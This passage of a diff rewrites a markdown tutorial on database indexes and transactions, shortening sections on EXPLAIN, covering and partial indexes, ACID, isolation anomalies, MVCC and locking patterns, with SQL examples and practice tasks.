 CREATE INDEX idx_status_created ON orders (status, created_at);
---                                          ^equality  ^range
-
--- USES the index fully: seek to status, then walk the date range.
-EXPLAIN ANALYZE
-SELECT * FROM orders
-WHERE status = 'paid' AND created_at > now() - interval '7 days';
-
--- CANNOT use it: created_at is not the leftmost column.
-EXPLAIN ANALYZE
-SELECT * FROM orders WHERE created_at > now() - interval '7 days';
---  -> Seq Scan. The leftmost-prefix rule, in action.
-
--- Prove the equality-before-range guidance by building the wrong order:
-CREATE INDEX idx_created_status ON orders (created_at, status);
--- Run the first query against each and compare `rows removed by filter`.
-
--- ============ 4. Covering index: eliminate the second lookup ============
-EXPLAIN (ANALYZE, BUFFERS)
-SELECT status, total FROM orders WHERE user_id = 4242;
---  Index Scan + heap fetches      <-- goes back to the table for each row
-
-CREATE INDEX idx_cover ON orders (user_id) INCLUDE (status, total);
---                                          ^ Postgres 11+; in MySQL you
---                                            just add them as index columns
+CREATE INDEX idx_cover ON orders (customer_id) INCLUDE (status, total);
+CREATE INDEX idx_email_lower ON orders (lower(email));
 
 EXPLAIN (ANALYZE, BUFFERS)
-SELECT status, total FROM orders WHERE user_id = 4242;
---  Index Only Scan using idx_cover      <-- the table is never touched
-
--- ============ 5. The six reasons an index is ignored, each fixed ========
-
--- (a) function on the column: index unusable
-EXPLAIN ANALYZE SELECT * FROM orders WHERE lower(email) = 'user42@example.com';
---  -> Seq Scan, even though email is indexable
-CREATE INDEX idx_email_lower ON orders (lower(email));      -- expression index
---  -> now an Index Scan
-
--- (b) leading wildcard vs prefix
-EXPLAIN ANALYZE SELECT * FROM orders WHERE email LIKE '%example.com';  -- scan
-EXPLAIN ANALYZE SELECT * FROM orders WHERE email LIKE 'user42%';       -- index
-
--- (c) low selectivity: the planner is CORRECT to ignore the index here
-CREATE INDEX idx_status ON orders (status);
-EXPLAIN ANALYZE SELECT * FROM orders WHERE status = 'paid';
---  -> Seq Scan, and that is the right choice: ~333,000 random row
---     fetches would cost far more than one sequential pass.
-
--- (d) OR across columns
-EXPLAIN ANALYZE SELECT * FROM orders WHERE user_id = 42 OR total = 499;
---  -> often a BitmapOr, or a scan. Rewriting usually wins:
-EXPLAIN ANALYZE
-  SELECT * FROM orders WHERE user_id = 42
-  UNION
-  SELECT * FROM orders WHERE total = 499;
-
--- (e) partial index: index only the rows you actually query
-CREATE INDEX idx_pending ON orders (created_at) WHERE status = 'paid';
---  A fraction of the size, and it serves the hot query perfectly.
-
--- (f) find indexes nobody is using, which are pure write-cost
-SELECT indexrelname, idx_scan, pg_size_pretty(pg_relation_size(indexrelid))
-FROM pg_stat_user_indexes
-WHERE idx_scan = 0 AND schemaname = 'public'
-ORDER BY pg_relation_size(indexrelid) DESC;
-
--- ============ 6. Measure the WRITE cost you just bought ================
--- Time this with 1 index, then with 6, on the same table.
-EXPLAIN ANALYZE
-INSERT INTO orders (user_id, status, total, email)
-SELECT (random()*50000)::int, 'paid', 100, 'x@y.com'
-FROM generate_series(1, 50000);
--- Every index is another tree to descend and possibly split, per row.
+SELECT status, total FROM orders WHERE customer_id = 4242;
+-- Prefer "Index Only Scan" when covering works
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Operation | No index | With B+ tree |
+| --------- | -------- | ------------ |
+| Point lookup | O(n) | O(log n) |
+| Range | O(n) | O(log n + k) |
+| Write | cheap | O(log n) per index |
+| `ORDER BY` indexed col | sort | walk leaves |
 
-"Why is my query slow, and how would you speed it up" is a near-universal backend interview question, and "add an index on the column in the WHERE clause" is the expected first move - followed immediately by "but don't index every column, because writes get slower and indexes cost storage." A resource worth internalizing on this specific trade-off: [Use The Index, Luke](https://use-the-index-luke.com/) - a full, vendor-agnostic guide to how indexing actually works and when it doesn't help.
+**PRACTICE:**
 
-The follow-ups are where levels get separated, and they are predictable enough to rehearse. "Why a B-tree and not a hash table" is answered by range queries and sorted output, not by asymptotic complexity. "Why a B-tree and not the BST from earlier" is answered by fanout and disk reads, ideally with the 3-versus-26 number. "I added the index and the query is still slow" invites you to walk the six causes above, and naming even three of them unprompted is a strong signal. "You have an index on `(a, b)`, does it help a query filtering only on `b`" is the leftmost-prefix rule and is asked constantly. "Would you index a boolean column" is a selectivity question where the correct answer is usually no, unless it is a partial index serving a query for the rare value. And "why might a UUID primary key be slower to insert than an auto-increment one" is a genuinely good discriminator, because it requires connecting clustering, page splits, and cache locality in one answer. The most common failure is treating indexes as free: any answer that adds indexes without mentioning the write cost or the storage cost has missed the point of the section.
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Insert keys into the B+ tree visualizer (max degree 3); draw after each split |
+| Easy | Index `(country, city, postcode)` — which filters can use it? |
+| Medium | Same composite in both column orders; prove equality-before-range with `EXPLAIN` |
+| Medium | Covering index → index-only scan; compare buffer reads |
+| Medium | Time 50k inserts with 1 index vs 6; report the write tax |
+| Hard | Why can a random UUID PK hurt inserts more than `bigserial`? (clustering + page splits) |
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**WHAT THIS UNLOCKS NEXT:**
 
+Indexes make a *single* query fast. They say nothing about two related writes that must succeed or fail together — debit one account, credit another. Crash between them and money vanishes or doubles. That unit of work is a **transaction** — Phase 64.
 
-| Difficulty | Task                                                                                                                                                                                                           |
-| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Insert the keys 10, 20, 5, 6, 12, 30, 7, 17 into the [B+ tree visualizer](https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html) with max degree 3 and draw the tree after each split                  |
-| Easy       | Run the setup code above and compare `EXPLAIN ANALYZE` before and after creating `idx_orders_user`. Record both row counts and both timings                                                                    |
-| Easy       | For an index on `(country, city, postcode)`, say which of these can use it: filter on country; on city; on country and city; on country and postcode                                                           |
-| Easy       | Explain in one sentence why a hash index cannot serve `ORDER BY` or `BETWEEN`                                                                                                                                  |
-| Medium     | Reproduce all six reasons an index is ignored, using `EXPLAIN` output as your evidence for each                                                                                                                |
-| Medium     | Build the same composite index in both column orders and demonstrate, with `EXPLAIN ANALYZE`, that equality-before-range is faster                                                                             |
-| Medium     | Turn a query into an index-only scan with a covering index and measure the improvement in buffer reads, not just time                                                                                          |
-| Medium     | Create a partial index for a rare status value and compare its size to the full index on the same column                                                                                                       |
-| Medium     | Time 50,000 inserts on a table with one index, then with six, and report the difference as a percentage                                                                                                        |
-| Medium     | Work through the concatenated-index chapter of [Use The Index, Luke](https://use-the-index-luke.com/sql/where-clause/the-equals-operator/concatenated-keys) and apply it to a slow query of your own           |
-| Hard       | Implement a B+ tree in the language of your choice with insertion, node splitting, deletion, and a linked leaf chain, then verify the height stays logarithmic as you insert a million keys                    |
-| Hard       | Build two tables identical except that one has a `bigserial` primary key and the other a random UUIDv4, insert a million rows into each, and explain the timing gap in terms of page splits and cache locality |
-| Hard       | Given a query with three predicates and an `ORDER BY`, design the single index that serves all of it, then prove it with an index-only scan in `EXPLAIN`                                                       |
-| Hard       | Read the [Postgres nbtree README](https://github.com/postgres/postgres/tree/master/src/backend/access/nbtree) and describe how it handles a concurrent insert during a page split                              |
-| Hard       | Take the later chapters of [cstack/db_tutorial](https://github.com/cstack/db_tutorial) and implement leaf-node splitting yourself                                                                              |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Transactions:** Indexes make a single query fast. They say nothing about what happens when *multiple* related writes need to succeed or fail together - e.g. transferring money between two accounts is really two writes (debit one, credit the other), and if the system crashes between them, you cannot be left with money that vanished or was duplicated.
 
 ---
 
@@ -12140,400 +11366,127 @@ The follow-ups are where levels get separated, and they are predictable enough t
 
 **WHAT YOU WILL BE ABLE TO DO:** Explain each ACID letter with a concrete failure it prevents, name the anomaly an isolation level blocks (dirty / non-repeatable / phantom / write skew), and say when your app must retry a serialization failure.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 63 (indexes make single queries fast - transactions make *groups* of writes safe), Phase 53 (mutex races are the same problem on rows).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 63 — fast single queries; Phase 53 — races on shared state.
+
+**LEARNING RESOURCES:**
+
+- [ACID Properties With Examples (ByteByteGo)](https://www.youtube.com/watch?v=GAe5oB742dw)
+- [PostgreSQL Transaction Isolation](https://www.postgresql.org/docs/current/transaction-iso.html)
+- [PostgreSQL MVCC intro](https://www.postgresql.org/docs/current/mvcc-intro.html)
+- [ept/hermitage](https://github.com/ept/hermitage) — anomalies vs real engines
+- [DDIA](https://dataintensive.net/) chapter 7
 
 ## 64.1 Transactions & ACID
 
-**WHY YOU ARE LEARNING THIS:** Some operations are only meaningful as a group - a bank transfer must either fully complete (both the debit and the credit happen) or fully not happen; there is no safe in-between state. A **transaction** groups multiple operations into a single all-or-nothing unit, and the guarantees a database makes about transactions are summarized as **ACID**.
+Indexes keep bookstore lookups fast. Checkout still needs two writes — decrement stock, insert the order — that must not leave a half-applied world. A **transaction** is that all-or-nothing unit. The guarantees are **ACID**.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**ALL OR NOTHING ACROSS MULTIPLE WRITES:**
 
-- Best animated explanation: [ACID Properties in Databases With Examples (ByteByteGo)](https://www.youtube.com/watch?v=GAe5oB742dw) *(Composio YouTube)*
-- Alternative: [What is a Database Transaction? Be ACID compliant! (Be A Better Dev)](https://www.youtube.com/watch?v=wHUOeXbZCYA) *(Composio YouTube)*; [ACID Transactions and Isolation Levels (Dr. Daniel Soper)](https://www.youtube.com/watch?v=BwaFhBCPDdc)
-- Another angle: [Dirty Reads, Inconsistent Reads, and Phantom Reads (Dr. Daniel Soper)](https://www.youtube.com/watch?v=ch65WIjhF4M) is the one to watch for the anomalies specifically, since naming them precisely is what interviews test, and [Isolation Levels in Database Management Systems (Edredo for Learners)](https://www.youtube.com/watch?v=-gxyut1VLcs) gives the level-by-level mapping
-- Interactive simulator: open **two** terminal sessions against the same Postgres or MySQL database, `BEGIN` a transaction in each, and interleave statements by hand. This is the best possible simulator for this section because you produce the anomalies yourself, deliberately, and watch one session block on the other. [DB Fiddle](https://www.db-fiddle.com/) will not do here, precisely because it gives you one session. [The Deadlock Empire](https://deadlockempire.github.io/) from Phase 53 is still relevant, since a database deadlock is the same cycle with rows instead of mutexes
-- Written documentation: [PostgreSQL's Transaction Isolation chapter](https://www.postgresql.org/docs/current/transaction-iso.html) *(Composio web)* tables which anomalies each level permits; [PostgreSQL MVCC intro](https://www.postgresql.org/docs/current/mvcc-intro.html); [DDIA](https://dataintensive.net/) chapter 7; [ept/hermitage](https://github.com/ept/hermitage)
-- GitHub implementation: [ept/hermitage](https://github.com/ept/hermitage) - a set of concrete test scripts that demonstrate each anomaly against each real database, which is unusually valuable because vendors interpret the isolation levels differently. For the internal steps, [erikgrinaker/toydb](https://github.com/erikgrinaker/toydb) implements MVCC in readable Rust
-- Practice platform: [ept/hermitage](https://github.com/ept/hermitage) run against a local Postgres and a local MySQL, comparing the results, is genuinely the best exercise in this section. For the write-skew problem specifically, [CMU's Database Systems assignments](https://15445.courses.cs.cmu.edu/) have you implement concurrency control yourself
+- **Atomicity** — all statements commit, or none do. Crash between debit and credit → undo via WAL (Phase 60); money does not vanish.
+- **Consistency** — commit only leaves a valid state (constraints still hold). An order referencing a deleted customer is rejected. *Not* the same as CAP "consistency" (later stories): ACID C is invariants *inside one database*.
+- **Isolation** — concurrent transactions behave as if they ran one after another, even though they interleave. This is Phase 53's race on rows — and it is a *dial*, not a single absolute.
+- **Durability** — after commit returns, the change survives a crash (WAL flushed). A "success" that disappears on power loss is a silent lie.
 
-**STEP-BY-STEP EXPLANATION**
-
-The letter that carries almost all the practical difficulty is **I**, and the reason is that "isolation" is not one guarantee but a dial with four standard settings, each permitting a specific, named set of anomalies. Learning the anomalies first makes the levels obvious rather than arbitrary.
-
-A **dirty read** is reading data another transaction wrote and has not committed, so you may act on a value that is about to be rolled back and never existed. A **non-repeatable read** is reading the same row twice within one transaction and getting different values, because another transaction committed a change in between. A **phantom read** is running the same query twice and getting different *rows*, because another transaction inserted or deleted rows matching your filter. And **write skew**, which the SQL standard does not name at all, is two transactions each reading a consistent state, each making a decision that is individually valid, and together violating a constraint that spans rows. The classic example is a hospital on-call rule requiring at least one doctor on duty: two doctors each check that the other is on call, each concludes it is safe to go off duty, and both leave. Neither transaction touched the same row, so no lock conflict occurred, and yet the invariant is broken.
-
-The four standard levels are defined by which of those they permit. **Read Uncommitted** permits everything including dirty reads and is essentially never the right choice. **Read Committed** prevents dirty reads by only ever showing committed data, and it is the default in Postgres, Oracle, and SQL Server. It still permits non-repeatable reads, which surprises people: two `SELECT`s in one transaction can genuinely disagree. **Repeatable Read** additionally guarantees that any row you read stays stable for the rest of the transaction, and it is the default in MySQL's InnoDB. **Serializable** guarantees the outcome is equivalent to running the transactions one at a time in some order, which is the only level that prevents write skew. The dial is a direct throughput-for-correctness trade, and choosing consciously is the whole point.
-
-An important, frequently-missed detail: the level names are standards, and the implementations are not identical. Postgres's Repeatable Read is implemented as snapshot isolation and actually prevents phantom reads, which the standard does not require, but it still permits write skew. MySQL's Repeatable Read behaves differently again, particularly around locking reads. This is precisely why Hermitage exists, and saying "which database, because they differ here" in an interview is a strong signal rather than a dodge.
-
-The mechanism underneath is worth knowing because it explains the performance characteristics. **Two-phase locking** acquires shared locks for reads and exclusive locks for writes, holds them until commit, and is genuinely correct but means readers block writers and writers block readers. **Multi-version concurrency control** instead keeps multiple committed versions of each row, tagged with transaction ids, so each transaction reads the snapshot that was current when it began. Readers never block and writers never block readers, which is a very large throughput win, and the costs are real: old versions accumulate and must be garbage-collected (Postgres's `VACUUM`), a long-running read transaction holds old versions alive and bloats the table, and two concurrent writers to the same row still conflict and one must abort and retry. That last point matters practically: at Serializable or Repeatable Read, your application must be prepared to catch a serialization failure and retry the transaction, and code that does not is code that will fail under load.
-
-Two application-level patterns are worth naming because they come up in nearly every real system. **Pessimistic locking** takes a lock up front with `SELECT ... FOR UPDATE`, which is the correct answer for the classic "two users book the last seat" problem, and it costs contention. **Optimistic locking** adds a version column, reads it, and includes `WHERE version = :old_version` in the update, so a zero-row update tells you someone else changed it first and you must re-read and retry. Optimistic is right when conflicts are rare, pessimistic when they are common, and being able to say which and why is a much better answer than reciting ACID.
-
-Finally, the boundaries of ACID deserve to be stated plainly, because it is easy to over-trust the acronym. ACID guarantees apply within one database. The moment a business operation spans two databases or two services, you no longer get atomicity for free, and the available answers are all worse: two-phase commit, which blocks if the coordinator dies, or the **saga pattern**, which executes the steps independently and defines a compensating action for each so that a partial failure can be unwound. This is exactly where Phase 85 picks up, and knowing that ACID stops at the database boundary is what makes the distributed chapters make sense.
-
-**The four guarantees, each as a response to a concrete failure:**
-
-- **Atomicity** all operations in a transaction succeed, or none do. *Problem it solves:* a crash between the debit and the credit in a transfer, without atomicity, leaves money destroyed or duplicated.
-- **Consistency** a transaction can only move the database from one valid state to another (all constraints - foreign keys, uniqueness, checks - still hold after it commits). *Problem it solves:* a transaction that would leave an order referencing a deleted user is rejected outright. **Not the same as CAP "consistency"** (Phase 85) - ACID C is about *invariants inside one database*, not about every replica seeing the same value at the same time.
-- **Isolation** concurrent transactions behave as if they ran one after another, even though they're actually interleaved for performance. *Problem it solves:* this is the exact race-condition problem from Phase 53, now applied to database rows instead of shared memory - two transactions reading and writing the same row at the same time must not corrupt each other's result. Isolation is a *dial* (levels above), not a single absolute.
-- **Durability** once a transaction commits, it survives a crash immediately afterward (typically by writing to the write-ahead log from Phase 60 before confirming success). *Problem it solves:* a "successful" write that's lost the instant the power blips is worse than useless - it's a silent lie.
-
-**PICTURE IT LIKE THIS**
-
-A bank wire transfer form that either fully processes - debit and credit both post - or is entirely voided and returned, never leaves the money in limbo. That "never leaves it in limbo" property is atomicity.
-
-**Internal Working - Isolation, and the trade-off it forces:** Perfect isolation (every transaction fully serialized, one at a time) is the *safest* option but throws away all concurrency, which is why databases offer *isolation levels* weaker guarantees that allow more concurrency at the cost of specific, well-documented anomalies becoming possible (e.g. one transaction seeing another's uncommitted changes). Choosing an isolation level is a direct, conscious trade-off between correctness guarantees and throughput.
-
-Drawn out, with each anomaly produced deliberately on a timeline:
+**THE ANOMALIES ISOLATION IS DEFINED AGAINST:**
 
 ```text
-ATOMICITY, and the mechanism that delivers it (from Phase 60's write-ahead log):
-
-  BEGIN
-    UPDATE accounts SET balance = balance - 100 WHERE id = 1;   -- debit
-    <<<<<<<<<<<<<<  CRASH HERE  >>>>>>>>>>>>>>
-    UPDATE accounts SET balance = balance + 100 WHERE id = 2;   -- credit
-  COMMIT
-
-  On restart, the log has the debit but NO commit record:
-        -> UNDO it. Account 1 is restored.
-  The alternative, without atomicity, is 100 units that simply
-  ceased to exist, with no record that anything went wrong.
-
-DIRTY READ  (permitted only by READ UNCOMMITTED)
-
-  T1                                    T2
-  --                                    --
-  BEGIN
-  UPDATE accounts
-    SET balance = 500 WHERE id = 1
-                                        BEGIN
-                                        SELECT balance WHERE id=1
-                                          -> reads 500   <-- DIRTY: not
-                                             committed yet
-  ROLLBACK                              (T2 acted on a value that
-    -> balance is 100 again              NEVER EXISTED)
-
-NON-REPEATABLE READ  (permitted by READ COMMITTED)
-
-  T1                                    T2
-  --                                    --
-  BEGIN
-  SELECT balance WHERE id=1  -> 100
-                                        BEGIN
-                                        UPDATE ... SET balance=500 WHERE id=1
-                                        COMMIT
-  SELECT balance WHERE id=1  -> 500     <-- THE SAME QUERY, SAME TRANSACTION,
-                                            A DIFFERENT ANSWER.
-  COMMIT
-  This is legal at Postgres's DEFAULT level, which surprises people.
-  Any logic that reads a value twice and assumes agreement is broken here.
-
-PHANTOM READ  (permitted by READ COMMITTED; prevented by snapshot isolation)
-
-  T1                                    T2
-  --                                    --
-  BEGIN
-  SELECT COUNT(*) WHERE total>100 -> 42
-                                        BEGIN
-                                        INSERT ... total = 200
-                                        COMMIT
-  SELECT COUNT(*) WHERE total>100 -> 43
-                                        <-- a NEW ROW appeared. Not a changed
-  COMMIT                                    value: a changed ROW SET.
-
-WRITE SKEW  (permitted by everything EXCEPT SERIALIZABLE, and NOT
-             named by the SQL standard at all)
-
-  Invariant to protect: at least ONE doctor must remain on call.
-  Currently on call: Alice and Bob. Both want to leave.
-
-  T1 (Alice)                            T2 (Bob)
-  --                                    --
-  BEGIN                                 BEGIN
-  SELECT COUNT(*) FROM shifts
-    WHERE on_call = true  -> 2
-    "2 > 1, safe to leave"              SELECT COUNT(*) FROM shifts
-                                          WHERE on_call = true  -> 2
-                                          "2 > 1, safe to leave"
-  UPDATE shifts SET on_call=false
-    WHERE doctor='alice'                UPDATE shifts SET on_call=false
-  COMMIT                                  WHERE doctor='bob'
-                                        COMMIT
-
-  Result: ZERO doctors on call.
-
-  NOTICE: the two transactions never touched the SAME ROW. There was no
-  lock conflict, no version conflict, nothing for MVCC to detect. Each
-  transaction was individually correct against a consistent snapshot.
-  The invariant spans rows, and only SERIALIZABLE catches that.
-
-  This is the anomaly that most often reaches production, because it
-  passes every test written by someone who only knows about lost updates.
-
-THE ISOLATION DIAL, as a table of what each level PERMITS:
-
-                     dirty   non-repeatable   phantom   write
-                     read    read             read      skew
-  READ UNCOMMITTED    YES        YES            YES       YES     <- fastest
-  READ COMMITTED       no        YES            YES       YES     <- PG default
-  REPEATABLE READ      no         no          maybe*      YES     <- MySQL dflt
-  SERIALIZABLE         no         no             no        no     <- safest
-
-  * The SQL standard permits phantoms at REPEATABLE READ. Postgres's
-    implementation (snapshot isolation) prevents them anyway. MySQL's
-    behaves differently again. THE NAMES ARE STANDARD; THE BEHAVIOR IS NOT.
-    Saying "which database, because they differ here" is a strong answer.
-
-  Cost direction:   throughput <----------------------> correctness
-
-TWO-PHASE LOCKING vs MVCC, drawn as who blocks whom:
-
-  2PL:    reader ---- blocks ----> writer
-          writer ---- blocks ----> reader
-          writer ---- blocks ----> writer
-          Correct, simple, and an analytics query can stall your writes.
-
-  MVCC:   row id=1 kept as a CHAIN of versions:
-             [v3: 500, txn 88] -> [v2: 200, txn 71] -> [v1: 100, txn 40]
-                    ^                    ^
-              a txn that began    a txn that began earlier reads
-              after 88 sees this  THIS one -- its own consistent snapshot
-
-          reader ---- NEVER blocks ----> writer
-          writer ---- NEVER blocks ----> reader
-          writer ---- still conflicts ---> writer   (one must abort, retry)
-
-          Costs: old versions accumulate -> VACUUM / garbage collection;
-                 a long-running read transaction pins old versions alive
-                 and BLOATS the table; and your application MUST handle
-                 serialization failures by retrying.
-
-THE TWO APPLICATION-LEVEL PATTERNS, on the "last seat" problem:
-
-  THE BUG (lost update):
-    T1: SELECT seats -> 1        T2: SELECT seats -> 1
-    T1: UPDATE seats = 0         T2: UPDATE seats = 0
-    -> TWO tickets sold, ONE seat existed. Phase 53's race, on disk.
-
-  PESSIMISTIC: take the lock up front.
-    BEGIN;
-      SELECT seats FROM events WHERE id=1 FOR UPDATE;  <-- T2 now WAITS here
-      UPDATE events SET seats = seats - 1 WHERE id=1;
-    COMMIT;
-    Right when conflicts are COMMON. Cost: contention, and deadlock risk
-    if different code paths lock rows in different orders (Phase 53, verbatim).
-
-  OPTIMISTIC: detect the conflict instead of preventing it.
-    read:   SELECT seats, version FROM events WHERE id=1;   -- version = 7
-    write:  UPDATE events SET seats = seats-1, version = 8
-            WHERE id = 1 AND version = 7;
-            -> 0 ROWS AFFECTED means somebody else won. Re-read and retry.
-    Right when conflicts are RARE. Cost: the retry loop is your job.
-
-  AND THE VERSION THAT NEEDS NEITHER, because the database does the
-  read and the write atomically in one statement:
-      UPDATE events SET seats = seats - 1 WHERE id = 1 AND seats > 0;
-      -> 0 rows affected means it was already sold out. No lock, no retry.
-      Whenever you can express the check as a WHERE clause, do that.
-
-WHERE ACID STOPS: two databases, one business operation.
-
-   +------------------+          +------------------+
-   | orders DB        |          | inventory DB     |
-   | INSERT order  OK |          | DECREMENT stock  |
-   +------------------+          |     FAILS        |
-                                 +------------------+
-   There is no transaction spanning both. Your options:
-
-   TWO-PHASE COMMIT: a coordinator asks both to PREPARE, then COMMIT.
-      Correct, and it BLOCKS INDEFINITELY if the coordinator dies while
-      participants are prepared. This is why it is rare in practice.
-
-   SAGA: do the steps independently, and define a COMPENSATING action
-      for each so a partial failure can be unwound.
-         place order  -> reserve stock -> charge card
-         cancel order <- release stock <- refund card
-      No atomicity, only eventual correctness, and the intermediate
-      states are VISIBLE to users. That is the honest trade, and it is
-      exactly where Phase 85 picks up.
+DIRTY READ — read another txn's uncommitted write; it may ROLLBACK.
+NON-REPEATABLE READ — same row, two SELECTs, different values after a commit.
+PHANTOM READ — same query, different *row set* after inserts/deletes.
+WRITE SKEW — each txn is locally valid; together they break a multi-row invariant.
+  Classic: two on-call doctors each see the other on duty, both go off duty.
+  They never touched the SAME row — only SERIALIZABLE catches this.
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+| Level | Dirty | Non-rep. | Phantom | Write skew |
+| ----- | ----- | -------- | ------- | ---------- |
+| Read Uncommitted | yes | yes | yes | yes |
+| Read Committed (PG default) | no | yes | yes | yes |
+| Repeatable Read (MySQL default*) | no | no | maybe* | yes |
+| Serializable | no | no | no | no |
 
+\* Names are standard; behavior differs (Postgres RR ≈ snapshot isolation and prevents phantoms; still allows write skew). Saying "which database?" is a strong answer.
 
-| Choice                               | What it buys                                                    | What it costs                                                                     |
-| ------------------------------------ | --------------------------------------------------------------- | --------------------------------------------------------------------------------- |
-| Read Uncommitted                     | Marginally less bookkeeping                                     | Dirty reads, so you can act on data that never existed. Essentially never correct |
-| Read Committed                       | No dirty reads, high concurrency, and it is the sane default    | Two reads in one transaction can disagree, and phantoms are permitted             |
-| Repeatable Read / snapshot isolation | Rows you read stay stable for the whole transaction             | Write skew is still possible, and writers may abort and need retrying             |
-| Serializable                         | The only level that prevents write skew and all other anomalies | Lower throughput, and more aborts, so a retry loop becomes mandatory              |
-| Two-phase locking                    | Conceptually simple and provably correct                        | Readers block writers, so one long analytics query can stall your write path      |
-| MVCC                                 | Readers and writers never block each other                      | Version bloat needing vacuum, and long transactions pin old versions alive        |
-| Pessimistic locking (`FOR UPDATE`)   | Zero wasted work when conflicts are common                      | Contention, waiting, and deadlock risk from inconsistent lock ordering            |
-| Optimistic locking (version column)  | No locks held, excellent under low contention                   | Wasted work on conflict, and you own the retry logic                              |
-| Durability via `fsync` on commit     | A commit that returns is genuinely survivable                   | A disk flush per commit, which is why group commit and batching exist             |
-| Two-phase commit across services     | Real atomicity across databases                                 | Blocks indefinitely if the coordinator fails mid-prepare                          |
-| Saga with compensations              | Availability, and no distributed coordinator                    | No atomicity, intermediate states are visible, and every step needs an inverse    |
+Throughput ←————————→ correctness. Raise the dial, expect more aborts.
 
+**MVCC VS LOCKS; APP PATTERNS:**
 
-**SMALL WORKING EXAMPLE**
+**Two-phase locking** — readers block writers and vice versa; simple, can stall writes behind analytics. **MVCC** — version chains; readers never block writers; writers still conflict with writers (one aborts). Costs: vacuum/GC; long reads pin old versions.
+
+Lost update on the last seat:
+
+```text
+BUG:  both read seats=1; both write seats=0  → two tickets, one seat.
+
+PESSIMISTIC: SELECT ... FOR UPDATE  (lock first; right when conflicts common)
+OPTIMISTIC:  version column; UPDATE ... WHERE version = :old  (0 rows → retry)
+BEST WHEN EXPRESSIBLE:
+  UPDATE events SET seats = seats - 1 WHERE id = 1 AND seats > 0;
+  -- 0 rows means sold out; no lock, no retry
+```
+
+ACID stops at **one database**. Across two services you get 2PC (blocks if coordinator dies) or **sagas** with compensating actions — Story XI territory. Know the boundary; do not pretend one `BEGIN` spans microservices.
 
 ```sql
--- ============ Run these in TWO separate sessions, side by side ============
--- Setup (session 1):
-CREATE TABLE accounts (id INT PRIMARY KEY, balance INT NOT NULL CHECK (balance >= 0));
-INSERT INTO accounts VALUES (1, 100), (2, 100);
-
-CREATE TABLE events (id INT PRIMARY KEY, seats INT NOT NULL, version INT NOT NULL DEFAULT 1);
-INSERT INTO events VALUES (1, 1, 1);      -- exactly ONE seat left
-
--- ============ 1. ATOMICITY: the whole point ============
 BEGIN;
   UPDATE accounts SET balance = balance - 100 WHERE id = 1;
   UPDATE accounts SET balance = balance + 100 WHERE id = 2;
 COMMIT;
--- Either both rows changed or neither did. There is no third outcome,
--- even if the machine loses power between the two statements.
-
--- Watch the CHECK constraint enforce Consistency and force a rollback:
-BEGIN;
-  UPDATE accounts SET balance = balance - 500 WHERE id = 1;   -- would be -400
-COMMIT;                          -- ERROR: check constraint violated
-SELECT * FROM accounts;          -- unchanged. The C in ACID, doing its job.
-
--- ============ 2. NON-REPEATABLE READ, produced deliberately ============
--- SESSION 1                          -- SESSION 2
-SET TRANSACTION ISOLATION LEVEL READ COMMITTED;
-BEGIN;
-SELECT balance FROM accounts WHERE id=1;   -- 100
-                                       --   BEGIN;
-                                       --   UPDATE accounts SET balance=500
-                                       --     WHERE id=1;
-                                       --   COMMIT;
-SELECT balance FROM accounts WHERE id=1;   -- 500  <-- SAME QUERY, DIFFERENT
-COMMIT;                                    --           ANSWER. Legal here.
-
--- Now prevent it by raising the level:
-SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;
-BEGIN;
-SELECT balance FROM accounts WHERE id=1;   -- 100
-                                       --   (session 2 commits 500 again)
-SELECT balance FROM accounts WHERE id=1;   -- STILL 100. Stable snapshot.
-COMMIT;
-
--- ============ 3. THE LOST UPDATE, and three fixes ============
-
--- THE BUG. Run both sessions' SELECTs before either UPDATE.
--- SESSION 1                          -- SESSION 2
-BEGIN;                                 --   BEGIN;
-SELECT seats FROM events WHERE id=1;   --   SELECT seats FROM events WHERE id=1;
-  -- 1                                 --     -- 1
-UPDATE events SET seats = 0 WHERE id=1;--   UPDATE events SET seats=0 WHERE id=1;
-COMMIT;                                --   COMMIT;
--- Two tickets sold. One seat existed.
-
--- FIX A: PESSIMISTIC. Session 2 BLOCKS at the SELECT until session 1 commits.
-BEGIN;
-  SELECT seats FROM events WHERE id = 1 FOR UPDATE;   -- lock acquired here
-  UPDATE events SET seats = seats - 1 WHERE id = 1;
-COMMIT;
-
--- FIX B: OPTIMISTIC. No lock; detect the conflict on write.
---   read:
-SELECT seats, version FROM events WHERE id = 1;        -- seats=1, version=1
---   write, asserting nothing changed underneath:
-UPDATE events SET seats = seats - 1, version = version + 1
-WHERE id = 1 AND version = 1;
--- 0 rows affected  ->  somebody else won. Re-read and retry in application code.
-
--- FIX C: BEST, when expressible. One atomic statement, no lock, no retry.
-UPDATE events SET seats = seats - 1 WHERE id = 1 AND seats > 0;
--- 0 rows affected means "already sold out", and it cannot oversell.
-
--- ============ 4. WRITE SKEW: only SERIALIZABLE stops this ============
-CREATE TABLE shifts (doctor TEXT PRIMARY KEY, on_call BOOLEAN NOT NULL);
-INSERT INTO shifts VALUES ('alice', true), ('bob', true);
-
--- At REPEATABLE READ, both succeed and the invariant breaks:
--- SESSION 1                              -- SESSION 2
-SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;
-BEGIN;                                     --   BEGIN;
-SELECT COUNT(*) FROM shifts WHERE on_call; --   SELECT COUNT(*) ... -- 2
-  -- 2, so "safe to leave"                 --     -- 2, so "safe to leave"
-UPDATE shifts SET on_call=false            --   UPDATE shifts SET on_call=false
-  WHERE doctor='alice';                    --     WHERE doctor='bob';
-COMMIT;                                    --   COMMIT;
-SELECT COUNT(*) FROM shifts WHERE on_call; -- 0.  INVARIANT VIOLATED.
-
--- At SERIALIZABLE, Postgres detects the dependency and aborts one:
-SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;
--- ...same interleaving...
--- ERROR: could not serialize access due to read/write dependencies
--- HINT: The transaction might succeed if retried.
+-- Both or neither — even if power fails between the UPDATEs.
 ```
 
 ```python playground=cs-phase-64-serializable-retry
